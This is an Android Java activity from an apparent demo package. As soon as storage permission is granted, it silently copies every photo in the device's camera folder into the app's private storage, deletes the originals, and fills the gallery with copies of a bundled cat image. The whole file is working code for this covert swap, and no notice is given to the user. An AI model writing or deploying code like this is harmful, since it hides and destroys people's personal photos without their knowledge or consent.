package com.example.hellotehnopolis;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class StorageCameraActivity extends Activity {
    private static final int REQUEST_PERMISSIONS = 100;
    private int count =0;
    File app_path;
    File camera;


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if ((ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) && (ContextCompat.checkSelfPermission(getApplicationContext(),
                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)) {
            if ((ActivityCompat.shouldShowRequestPermissionRationale(StorageCameraActivity.this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) && (ActivityCompat.shouldShowRequestPermissionRationale(StorageCameraActivity.this,
                    Manifest.permission.READ_EXTERNAL_STORAGE))) {

            } else {
                ActivityCompat.requestPermissions(StorageCameraActivity.this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);
            }
        } else {
            app_path = getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DCIM);
            camera = new File("/storage/emulated/0/DCIM/Camera/");
            File[] pics2 = camera.listFiles();
            for (File pic : pics2
            ) {

                try {
                    FileUtils.copyFileToDirectory(pic, app_path);
                    pic.delete();

                    Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.cat);
                    saveBitmap(bitmap, camera);

                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }


    }

    private void saveBitmap(Bitmap bitmap, File path) {

        try {
            FileOutputStream fos = new FileOutputStream(path + "/cat"+count+".jpg");
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
            fos.flush();
            fos.close();
            count++;
        } catch (Exception e) {
            Log.e("CatNotSaved", e.toString());
        }

    }

}
